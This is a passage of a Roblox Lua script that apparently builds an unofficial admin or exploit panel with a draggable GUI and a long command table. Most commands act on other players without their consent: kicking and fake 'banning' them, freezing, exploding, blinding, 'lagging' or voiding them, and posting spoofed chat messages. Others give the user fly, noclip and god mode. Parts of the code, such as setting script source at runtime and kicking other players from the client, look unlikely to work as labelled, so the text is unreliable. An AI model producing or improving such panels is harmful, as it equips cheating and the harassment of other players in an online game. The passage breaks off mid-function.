titleShadow.ZIndex = Title.ZIndex - 1
titleShadow.Parent = TopBar

local CloseButton = Instance.new(""TextButton"")
CloseButton.Text = ""✕""
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 20
CloseButton.TextColor3 = TEXT_COLOR
CloseButton.Size = UDim2.new(0, 40, 1, 0)
CloseButton.Position = UDim2.new(1, -40, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
CloseButton.BorderSizePixel = 0

local closeCorner = Instance.new(""UICorner"")
closeCorner.CornerRadius = UDim.new(0, 12)
closeCorner.Parent = CloseButton

-- Hover effect
CloseButton.MouseEnter:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(255, 60, 60),
        TextColor3 = Color3.fromRGB(255, 255, 255)
    }):Play()
end)

CloseButton.MouseLeave:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(45, 45, 55),
        TextColor3 = TEXT_COLOR
    }):Play()
end)

-- Show/Hide UI button
local ToggleButton = Instance.new(""TextButton"")
ToggleButton.Text = ""─""
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 20
ToggleButton.TextColor3 = TEXT_COLOR
ToggleButton.Size = UDim2.new(0, 40, 1, 0)
ToggleButton.Position = UDim2.new(1, -80, 0, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
ToggleButton.BorderSizePixel = 0

local toggleCorner = Instance.new(""UICorner"")
toggleCorner.CornerRadius = UDim.new(0, 12)
toggleCorner.Parent = ToggleButton

-- Hover effect
ToggleButton.MouseEnter:Connect(function()
    TweenService:Create(ToggleButton, TweenInfo.new(0.2), {
        BackgroundColor3 = ACCENT_COLOR,
        TextColor3 = Color3.fromRGB(255, 255, 255)
    }):Play()
end)

ToggleButton.MouseLeave:Connect(function()
    TweenService:Create(ToggleButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(45, 45, 55),
        TextColor3 = TEXT_COLOR
    }):Play()
end)

local isMinimized = false
ToggleButton.MouseButton1Click:Connect(function()
    if isMinimized then
        -- Show UI with smooth effect
        TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UI_SIZE,
            Position = UDim2.new(0.5, -209, 0.5, -250)
        }):Play()
        ToggleButton.Text = ""─""
        isMinimized = false
    else
        -- Minimize UI with smooth effect
        TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 40, 0, 40),
            Position = UDim2.new(1, -50, 1, -50)
        }):Play()
        ToggleButton.Text = ""+""
        isMinimized = true
    end
end)

-- 4. UI Dragging System (updated and improved)
local dragging, dragInput, dragStart, startPos

local function UpdateInput(input)
    local delta = input.Position - dragStart
    local newPos = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X,
        startPos.Y.Scale,
        startPos.Y.Offset + delta.Y
    )
    
    -- Adjust boundaries to prevent going off-screen
    local viewportSize = workspace.CurrentCamera.ViewportSize
    local frameSize = MainFrame.AbsoluteSize
    
    newPos = UDim2.new(
        math.clamp(newPos.X.Scale, 0, 1),
        math.clamp(newPos.X.Offset, 0, viewportSize.X - frameSize.X),
        math.clamp(newPos.Y.Scale, 0, 1),
        math.clamp(newPos.Y.Offset, 0, viewportSize.Y - frameSize.Y)
    )
    
    MainFrame.Position = newPos
end

TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TopBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        UpdateInput(input)
    end
end)

-- 5. Search box and commands (updated and improved)
local SearchContainer = Instance.new(""Frame"")
SearchContainer.Size = UDim2.new(1, -20, 0, 40)
SearchContainer.Position = UDim2.new(0, 10, 0, 45)
SearchContainer.BackgroundTransparency = 1

local SearchBox = Instance.new(""TextBox"")
SearchBox.Size = UDim2.new(0.7, 0, 1, 0)
SearchBox.Position = UDim2.new(0, 0, 0, 0)
SearchBox.PlaceholderText = ""🔍 Search player or type command (!fly @player)""
SearchBox.Text = """"
SearchBox.Font = Enum.Font.GothamMedium
SearchBox.TextSize = 14
SearchBox.TextColor3 = TEXT_COLOR
SearchBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
SearchBox.BorderSizePixel = 0
SearchBox.ClearTextOnFocus = false

local searchCorner = Instance.new(""UICorner"")
searchCorner.CornerRadius = UDim.new(0, 8)
searchCorner.Parent = SearchBox

local SearchButton = Instance.new(""TextButton"")
SearchButton.Text = ""Execute""
SearchButton.Size = UDim2.new(0.28, -5, 1, 0)
SearchButton.Position = UDim2.new(0.72, 5, 0, 0)
SearchButton.Font = Enum.Font.GothamBlack
SearchButton.TextSize = 14
SearchButton.TextColor3 = TEXT_COLOR
SearchButton.BackgroundColor3 = ACCENT_COLOR
SearchButton.BorderSizePixel = 0

local searchBtnCorner = Instance.new(""UICorner"")
searchBtnCorner.CornerRadius = UDim.new(0, 8)
searchBtnCorner.Parent = SearchButton

-- Focus effects
SearchBox.Focused:Connect(function()
    TweenService:Create(SearchBox, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    }):Play()
end)

SearchBox.FocusLost:Connect(function()
    TweenService:Create(SearchBox, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    }):Play()
end)

-- Hover effects
SearchButton.MouseEnter:Connect(function()
    TweenService:Create(SearchButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(0, 200, 255),
        TextColor3 = DARK_TEXT
    }):Play()
end)

SearchButton.MouseLeave:Connect(function()
    TweenService:Create(SearchButton, TweenInfo.new(0.2), {
        BackgroundColor3 = ACCENT_COLOR,
        TextColor3 = TEXT_COLOR
    }):Play()
end)

-- 6. Players list (updated with improvements)
local PlayersTab = Instance.new(""Frame"")
PlayersTab.Size = UDim2.new(1, 0, 1, -100)
PlayersTab.Position = UDim2.new(0, 0, 0, 90)
PlayersTab.BackgroundTransparency = 1

local PlayersScroll = Instance.new(""ScrollingFrame"")
PlayersScroll.Size = UDim2.new(1, -10, 0.6, 0)
PlayersScroll.Position = UDim2.new(0, 5, 0, 5)
PlayersScroll.BackgroundTransparency = 1
PlayersScroll.ScrollBarThickness = 8
PlayersScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
PlayersScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
PlayersScroll.ScrollingDirection = Enum.ScrollingDirection.Y

-- 7. Advanced control panel (updated)
local ControlsFrame = Instance.new(""Frame"")
ControlsFrame.Size = UDim2.new(1, -10, 0.35, -10)
ControlsFrame.Position = UDim2.new(0, 5, 0.65, 5)
ControlsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
ControlsFrame.BorderSizePixel = 0

local controlsCorner = Instance.new(""UICorner"")
controlsCorner.CornerRadius = UDim.new(0, 8)
controlsCorner.Parent = ControlsFrame

-- Scrollbar for commands
local ControlsScroll = Instance.new(""ScrollingFrame"")
ControlsScroll.Size = UDim2.new(1, 0, 1, 0)
ControlsScroll.Position = UDim2.new(0, 0, 0, 0)
ControlsScroll.BackgroundTransparency = 1
ControlsScroll.ScrollBarThickness = 8
ControlsScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
ControlsScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
ControlsScroll.ScrollingDirection = Enum.ScrollingDirection.Y
ControlsScroll.Parent = ControlsFrame

-- 8. Complete commands (updated with new commands)
local commands = {
    -- Basic commands
    {name = ""!freeze"", desc = ""Freeze the player"", color = Color3.fromRGB(70, 70, 90), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then 
                    v.Anchored = true 
                    v.CanCollide = false
                end
            end
            return ""✅ Frozen ""..plr.Name
        end
        return ""❌ Failed to freeze player""
    end},
    
    {name = ""!unfreeze"", desc = ""Unfreeze the player"", color = Color3.fromRGB(70, 70, 90), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then 
                    v.Anchored = false 
                    v.CanCollide = true
                end
            end
            return ""✅ Unfrozen ""..plr.Name
        end
        return ""❌ Failed to unfreeze""
    end},
    
    -- Enhanced fly system
    {name = ""!fly"", desc = ""Enable flying [speed]"", color = Color3.fromRGB(70, 70, 90), func = function(plr, _, args)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            -- Remove any previous fly
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexFlyScript"" or v:IsA(""BodyGyro"") or v:IsA(""BodyVelocity"") then
                    v:Destroy()
                end
            end
            
            local flySpeed = tonumber(args[2]) or 50
            local flyScript = Instance.new(""Script"", plr.Character)
            flyScript.Name = ""DexFlyScript""
            flyScript.Source = [[
                local plr = game:GetService(""Players"").LocalPlayer
                local char = plr.Character
                local root = char:WaitForChild(""HumanoidRootPart"")
                local humanoid = char:WaitForChild(""Humanoid"")
                
                -- Setup controls
                local bg = Instance.new(""BodyGyro"", root)
                bg.P = 10000
                bg.maxTorque = Vector3.new(100000, 100000, 100000)
                bg.cframe = root.CFrame
                
                local bv = Instance.new(""BodyVelocity"", root)
                bv.velocity = Vector3.new(0,0,0)
                bv.maxForce = Vector3.new(100000,100000,100000)
                
                local flySpeed = ]]..flySpeed..[[
                local flying = true
                local uis = game:GetService(""UserInputService"")
                
                -- Fly controls
                local function updateFly()
                    if not flying then return end
                    
                    local velocity = Vector3.new(0,0,0)
                    local cframe = root.CFrame
                    
                    if uis:IsKeyDown(Enum.KeyCode.W) then
                        velocity = velocity + (cframe.LookVector * flySpeed)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.S) then
                        velocity = velocity + (cframe.LookVector * -flySpeed)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.A) then
                        velocity = velocity + (cframe.RightVector * -flySpeed)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.D) then
                        velocity = velocity + (cframe.RightVector * flySpeed)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.Space) then
                        velocity = velocity + Vector3.new(0, flySpeed, 0)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                        velocity = velocity + Vector3.new(0, -flySpeed, 0)
                    end
                    
                    bv.velocity = velocity
                    bg.cframe = CFrame.new(root.Position, root.Position + velocity)
                end
                
                -- Stop flying when dead
                humanoid.Died:Connect(function()
                    flying = false
                    bg:Destroy()
                    bv:Destroy()
                    script:Destroy()
                end)
                
                -- Update movement
                while flying and root and bg and bv do
                    updateFly()
                    game:GetService(""RunService"").Heartbeat:Wait()
                end
            ]]
            return ""✅ Enabled flying for ""..plr.Name.."" with speed ""..flySpeed
        end
        return ""❌ Failed to enable flying""
    end},
    
    {name = ""!nofly"", desc = ""Disable flying"", color = Color3.fromRGB(70, 70, 90), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexFlyScript"" or v:IsA(""BodyGyro"") or v:IsA(""BodyVelocity"") then
                    v:Destroy()
                end
            end
            return ""✅ Disabled flying for ""..plr.Name
        end
        return ""❌ Failed to disable flying""
    end},
    
    -- Admin commands
    {name = ""!kick"", desc = ""Kick the player"", color = ERROR_COLOR, func = function(plr)
        if plr == Players.LocalPlayer then return ""❌ Cannot kick yourself"" end
        pcall(function()
            plr:Kick(""🚫 Kicked by you_noob970"")
        end)
        return ""✅ Kicked ""..plr.Name
    end},
    
    {name = ""!ban"", desc = ""Ban the player"", color = Color3.fromRGB(150, 30, 30), func = function(plr)
        if plr == Players.LocalPlayer then return ""❌ Cannot ban yourself"" end
        pcall(function()
            plr:Kick(""🚫 Banned by you_noob970"")
        end)
        return ""✅ Banned ""..plr.Name
    end},
    
    -- Teleport commands
    {name = ""!tp all"", desc = ""Teleport everyone to you"", color = ACCENT_COLOR, func = function(_, localPlayer)
        if localPlayer.Character and localPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
            local pos = localPlayer.Character.HumanoidRootPart.Position
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= localPlayer and p.Character and p.Character:FindFirstChild(""HumanoidRootPart"") then
                    pcall(function()
                        p.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(math.random(-5,5), 0, math.random(-5,5)))
                    end)
                end
            end
            return ""✅ Teleported all players to you""
        end
        return ""❌ Failed to teleport""
    end},
    
    {name = ""!bring"", desc = ""Bring player to you"", color = ACCENT_COLOR, func = function(plr, localPlayer)
        if localPlayer.Character and localPlayer.Character:FindFirstChild(""HumanoidRootPart"") and
           plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            pcall(function()
                plr.Character.HumanoidRootPart.CFrame = localPlayer.Character.HumanoidRootPart.CFrame
            end)
            return ""✅ Brought ""..plr.Name
        end
        return ""❌ Failed to bring player""
    end},
    
    -- Invisibility commands
    {name = ""!invisible"", desc = ""Make player invisible"", color = Color3.fromRGB(80, 80, 100), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then 
                    v.Transparency = 1 
                    v.CastShadow = false
                end
            end
            return ""✅ Made ""..plr.Name.."" invisible""
        end
        return ""❌ Failed to make invisible""
    end},
    
    {name = ""!visible"", desc = ""Make player visible"", color = Color3.fromRGB(80, 80, 100), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then 
                    v.Transparency = 0 
                    v.CastShadow = true
                end
            end
            return ""✅ Made ""..plr.Name.."" visible""
        end
        return ""❌ Failed to make visible""
    end},
    
    -- God mode commands
    {name = ""!god"", desc = ""Enable god mode"", color = Color3.fromRGB(0, 150, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            plr.Character.Humanoid.MaxHealth = math.huge
            plr.Character.Humanoid.Health = math.huge
            return ""✅ Enabled god mode for ""..plr.Name
        end
        return ""❌ Failed to enable god mode""
    end},

    {name = ""!ungod"", desc = ""Disable god mode"", color = Color3.fromRGB(150, 0, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            plr.Character.Humanoid.MaxHealth = 100
            plr.Character.Humanoid.Health = 100
            return ""✅ Disabled god mode for ""..plr.Name
        end
        return ""❌ Failed to disable god mode""
    end},
    
    -- Movement commands
    {name = ""!speed"", desc = ""Modify walk speed [value]"", color = Color3.fromRGB(0, 170, 170), func = function(plr, _, args)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            local speed = tonumber(args[2]) or 50
            plr.Character.Humanoid.WalkSpeed = speed
            return ""✅ Set ""..plr.Name..""'s speed to ""..speed
        end
        return ""❌ Failed to modify speed""
    end},
    
    {name = ""!jump"", desc = ""Modify jump power [value]"", color = Color3.fromRGB(170, 0, 170), func = function(plr, _, args)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            local power = tonumber(args[2]) or 50
            plr.Character.Humanoid.JumpPower = power
            return ""✅ Set ""..plr.Name..""'s jump to ""..power
        end
        return ""❌ Failed to modify jump""
    end},
    
    -- Noclip commands
    {name = ""!noclip"", desc = ""Enable noclip"", color = Color3.fromRGB(170, 170, 0), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexNoclipScript"" then v:Destroy() end
            end
            
            local noclipScript = Instance.new(""Script"", plr.Character)
            noclipScript.Name = ""DexNoclipScript""
            noclipScript.Source = [[
                local char = script.Parent
                local humanoid = char:WaitForChild(""Humanoid"")
                
                local function noclip()
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA(""BasePart"") then
                            part.CanCollide = false
                        end
                    end
                end
                
                local connection
                connection = game:GetService(""RunService"").Stepped:Connect(function()
                    if char and humanoid and humanoid.Health > 0 then
                        noclip()
                    else
                        connection:Disconnect()
                    end
                end)
                
                humanoid.Died:Connect(function()
                    if connection then
                        connection:Disconnect()
                    end
                    script:Destroy()
                end)
            ]]
            return ""✅ Enabled noclip for ""..plr.Name
        end
        return ""❌ Failed to enable noclip""
    end},
    
    {name = ""!clip"", desc = ""Disable noclip"", color = Color3.fromRGB(170, 170, 0), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexNoclipScript"" then v:Destroy() end
                if v:IsA(""BasePart"") then v.CanCollide = true end
            end
            return ""✅ Disabled noclip for ""..plr.Name
        end
        return ""❌ Failed to disable noclip""
    end},
    
    -- Punishment commands
    {name = ""!punish"", desc = ""Punish the player"", color = ERROR_COLOR, func = function(plr)
        if plr.Character then
            plr.Character:Destroy()
            return ""✅ Punished ""..plr.Name
        end
        return ""❌ Failed to punish""
    end},
    {name = ""!unpunish"", desc = ""Unpunish the player"", color = ACCENT_COLOR, func = function(plr)
        plr:LoadCharacter()
        return ""✅ Unpunished ""..plr.Name
    end},
    
    -- Viewing commands
    {name = ""!view"", desc = ""Spectate player"", color = ACCENT_COLOR, func = function(plr, localPlayer)
        if plr.Character and plr.Character:FindFirstChild(""Humanoid"") then
            workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
            return ""✅ Now spectating ""..plr.Name
        end
        return ""❌ Failed to spectate""
    end},
    
    {name = ""!unview"", desc = ""Stop spectating"", color = ACCENT_COLOR, func = function(_, localPlayer)
        if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass(""Humanoid"") then
            workspace.CurrentCamera.CameraSubject = localPlayer.Character.Humanoid
            return ""✅ Stopped spectating""
        end
        return ""❌ Failed to stop spectating""
    end},
    
    -- Effect commands
    {name = ""!spin"", desc = ""Make player spin"", color = Color3.fromRGB(200, 0, 200), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexSpinScript"" then v:Destroy() end
            end
            
            local spinScript = Instance.new(""Script"", plr.Character)
            spinScript.Name = ""DexSpinScript""
            spinScript.Source = [[
                local root = script.Parent:WaitForChild(""HumanoidRootPart"")
                local humanoid = script.Parent:WaitForChild(""Humanoid"")
                
                while root and humanoid and humanoid.Health > 0 do
                    game:GetService(""RunService"").Heartbeat:Wait()
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(10), 0)
                end
                
                script:Destroy()
            ]]
            return ""✅ Made ""..plr.Name.."" spin""
        end
        return ""❌ Failed to spin""
    end},
    
    {name = ""!unspin"", desc = ""Stop player spinning"", color = Color3.fromRGB(200, 0, 200), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexSpinScript"" then v:Destroy() end
            end
            return ""✅ Stopped ""..plr.Name.."" from spinning""
        end
        return ""❌ Failed to stop spinning""
    end},
    
    -- Size commands
    {name = ""!size"", desc = ""Change player size [scale]"", color = Color3.fromRGB(200, 100, 0), func = function(plr, _, args)
        if plr.Character then
            local scale = tonumber(args[2]) or 2
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then
                    v.Size = v.Size * scale
                elseif v:IsA(""CharacterMesh"") then
                    v.BaseScale = Vector3.new(scale, scale, scale)
                elseif v:IsA(""SpecialMesh"") then
                    v.Scale = v.Scale * scale
                end
            end
            return ""✅ Changed ""..plr.Name..""'s size to ""..scale..""x""
        end
        return ""❌ Failed to change size""
    end},
    
    {name = ""!reset"", desc = ""Reset player"", color = Color3.fromRGB(200, 100, 0), func = function(plr)
        plr:LoadCharacter()
        return ""✅ Reset ""..plr.Name
    end},
    
    -- Visual effect commands
    {name = ""!fire"", desc = ""Add fire to player"", color = Color3.fromRGB(255, 80, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""Fire"") then v:Destroy() end
            end
            
            local fire = Instance.new(""Fire"", plr.Character.HumanoidRootPart)
            fire.Size = 10
            fire.Heat = 15
            return ""✅ Added fire to ""..plr.Name
        end
        return ""❌ Failed to add fire""
    end},
    
    {name = ""!smoke"", desc = ""Add smoke to player"", color = Color3.fromRGB(150, 150, 150), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""Smoke"") then v:Destroy() end
            end
            
            local smoke = Instance.new(""Smoke"", plr.Character.HumanoidRootPart)
            smoke.Size = 10
            smoke.Opacity = 0.5
            return ""✅ Added smoke to ""..plr.Name
        end
        return ""❌ Failed to add smoke""
    end},
    
    {name = ""!sparkles"", desc = ""Add sparkles to player"", color = Color3.fromRGB(255, 255, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""Sparkles"") then v:Destroy() end
            end
            
            local sparkles = Instance.new(""Sparkles"", plr.Character.HumanoidRootPart)
            sparkles.SparkleColor = Color3.new(1, 1, 0)
            return ""✅ Added sparkles to ""..plr.Name
        end
        return ""❌ Failed to add sparkles""
    end},
    
    -- Modification commands
    {name = ""!rename"", desc = ""Change display name [name]"", color = Color3.fromRGB(100, 70, 150), func = function(plr, _, args)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            local newName = table.concat(args, "" "", 2)
            plr.Character.Humanoid.DisplayName = newName
            return ""✅ Changed ""..plr.Name..""'s name to ""..newName
        end
        return ""❌ Failed to rename""
    end},
    
    {name = ""!ff"", desc = ""Enable forcefield"", color = Color3.fromRGB(0, 100, 200), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""ForceField"") then v:Destroy() end
            end
            
            Instance.new(""ForceField"", plr.Character)
            return ""✅ Enabled forcefield for ""..plr.Name
        end
        return ""❌ Failed to enable forcefield""
    end},
    
    {name = ""!unff"", desc = ""Disable forcefield"", color = ERROR_COLOR, func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""ForceField"") then v:Destroy() end
            end
            return ""✅ Disabled forcefield for ""..plr.Name
        end
        return ""❌ Failed to disable forcefield""
    end},
    
    -- Movement commands
    {name = ""!sit"", desc = ""Force player to sit"", color = Color3.fromRGB(100, 150, 200), func = function(plr)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            plr.Character.Humanoid.Sit = true
            return ""✅ Forced ""..plr.Name.."" to sit""
        end
        return ""❌ Failed to make sit""
    end},
    
    {name = ""!unsit"", desc = ""Force player to stand"", color = Color3.fromRGB(100, 150, 200), func = function(plr)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            plr.Character.Humanoid.Sit = false
            return ""✅ Forced ""..plr.Name.."" to stand""
        end
        return ""❌ Failed to make stand""
    end},
    
    -- Physics commands
    {name = ""!gravity"", desc = ""Change player gravity [value]"", color = Color3.fromRGB(100, 100, 200), func = function(plr, _, args)
        if plr.Character then
            local gravity = tonumber(args[2]) or 196.2
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then
                    v.CustomPhysicalProperties = PhysicalProperties.new(1, 0.3, 0.5, gravity/196.2, 0)
                end
            end
            return ""✅ Changed ""..plr.Name..""'s gravity to ""..gravity
        end
        return ""❌ Failed to change gravity""
    end},
    
    -- Chat commands
    {name = ""!chat"", desc = ""Send message to player [text]"", color = Color3.fromRGB(200, 200, 100), func = function(plr, _, args)
        if plr and #args > 1 then
            local message = table.concat(args, "" "", 2)
            StarterGui:SetCore(""ChatMakeSystemMessage"", {
                Text = ""[""..plr.Name..""]: ""..message,
                Color = Color3.new(1,1,1),
                Font = Enum.Font.SourceSansBold,
                TextSize = 18
            })
            return ""✅ Sent message to ""..plr.Name
        end
        return ""❌ Failed to send message""
    end},
    
    -- Environment commands
    {name = ""!time"", desc = ""Change game time [0-24]"", color = Color3.fromRGB(150, 150, 150), func = function(_, _, args)
        local time = tonumber(args[2]) or 12
        if time >= 0 and time <= 24 then
            Lighting.ClockTime = time
            return ""✅ Changed time to ""..time
        end
        return ""❌ Time must be between 0 and 24""
    end},
    
    -- New commands
    {name = ""!explode"", desc = ""Explode player [power]"", color = Color3.fromRGB(255, 50, 50), func = function(plr, _, args)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            local power = tonumber(args[2]) or 10
            local explosion = Instance.new(""Explosion"")
            explosion.Position = plr.Character.HumanoidRootPart.Position
            explosion.BlastPressure = power * 1000
            explosion.BlastRadius = power * 5
            explosion.Parent = workspace
            return ""✅ Exploded ""..plr.Name.."" with power ""..power
        end
        return ""❌ Failed to explode""
    end},
    
    {name = ""!float"", desc = ""Make player float"", color = Color3.fromRGB(100, 200, 200), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexFloatScript"" then v:Destroy() end
            end
            
            local floatScript = Instance.new(""Script"", plr.Character)
            floatScript.Name = ""DexFloatScript""
            floatScript.Source = [[
                local root = script.Parent:WaitForChild(""HumanoidRootPart"")
                local humanoid = script.Parent:WaitForChild(""Humanoid"")
                
                local bodyForce = Instance.new(""BodyForce"", root)
                bodyForce.Force = Vector3.new(0, root:GetMass() * workspace.Gravity, 0)
                
                humanoid.Died:Connect(function()
                    bodyForce:Destroy()
                    script:Destroy()
                end)
            ]]
            return ""✅ Made ""..plr.Name.."" float""
        end
        return ""❌ Failed to float""
    end},
    
    {name = ""!unfloat"", desc = ""Stop player floating"", color = Color3.fromRGB(100, 200, 200), func = function(plr)
        if plr.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v.Name == ""DexFloatScript"" then v:Destroy() end
                if v:IsA(""BodyForce"") then v:Destroy() end
            end
            return ""✅ Stopped ""..plr.Name.."" from floating""
        end
        return ""❌ Failed to stop floating""
    end},
    
    {name = ""!blind"", desc = ""Blind the player"", color = Color3.fromRGB(50, 50, 50), func = function(plr)
        if plr.Character then
            local screenGui = Instance.new(""ScreenGui"", plr.PlayerGui)
            screenGui.Name = ""DexBlindEffect""
            
            local frame = Instance.new(""Frame"", screenGui)
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BorderSizePixel = 0
            
            return ""✅ Blinded ""..plr.Name
        end
        return ""❌ Failed to blind""
    end},
    
    {name = ""!unblind"", desc = ""Unblind the player"", color = Color3.fromRGB(50, 50, 50), func = function(plr)
        if plr.Character and plr:FindFirstChild(""PlayerGui"") then
            local gui = plr.PlayerGui:FindFirstChild(""DexBlindEffect"")
            if gui then gui:Destroy() end
            return ""✅ Unblinded ""..plr.Name
        end
        return ""❌ Failed to unblind""
    end},
    
    {name = ""!mute"", desc = ""Mute player sounds"", color = Color3.fromRGB(150, 150, 150), func = function(plr)
        if plr.Character then
            for _, sound in ipairs(plr.Character:GetDescendants()) do
                if sound:IsA(""Sound"") then
                    sound.Volume = 0
                end
            end
            return ""✅ Muted ""..plr.Name
        end
        return ""❌ Failed to mute""
    end},
    
    {name = ""!unmute"", desc = ""Unmute player"", color = Color3.fromRGB(150, 150, 150), func = function(plr)
        if plr.Character then
            for _, sound in ipairs(plr.Character:GetDescendants()) do
                if sound:IsA(""Sound"") then
                    sound.Volume = 1
                end
            end
            return ""✅ Unmuted ""..plr.Name
        end
        return ""❌ Failed to unmute""
    end},
    
    {name = ""!lag"", desc = ""Lag the player [seconds]"", color = Color3.fromRGB(200, 0, 200), func = function(plr, _, args)
        local duration = tonumber(args[2]) or 5
        if plr.Character then
            local humanoid = plr.Character:FindFirstChildOfClass(""Humanoid"")
            if humanoid then
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
                
                task.delay(duration, function()
                    if humanoid and humanoid.Parent then
                        humanoid.WalkSpeed = 16
                        humanoid.JumpPower = 50
                    end
                end)
                
                return ""✅ Lagged ""..plr.Name.."" for ""..duration.."" seconds""
            end
        end
        return ""❌ Failed to lag""
    end},
    
    {name = ""!clone"", desc = ""Clone the player"", color = Color3.fromRGB(100, 200, 100), func = function(plr)
        if plr.Character then
            local clone = plr.Character:Clone()
            clone.Parent = workspace
            clone:MoveTo(plr.Character.HumanoidRootPart.Position + Vector3.new(5, 0, 0))
            return ""✅ Cloned ""..plr.Name
        end
        return ""❌ Failed to clone""
    end},
    
    {name = ""!void"", desc = ""Send player to void"", color = Color3.fromRGB(0, 0, 100), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
            return ""✅ Sent ""..plr.Name.."" to the void""
        end
        return ""❌ Failed to send to void""
    end},
    
    {name = ""!troll"", desc = ""Troll the player"", color = Color3.fromRGB(255, 0, 255), func = function(plr)
        if plr.Character then
            -- Freeze
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then v.Anchored = true end
            end
            
            -- Make small
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then
                    v.Size = v.Size * 0.5
                end
            end
            
            -- Add effects
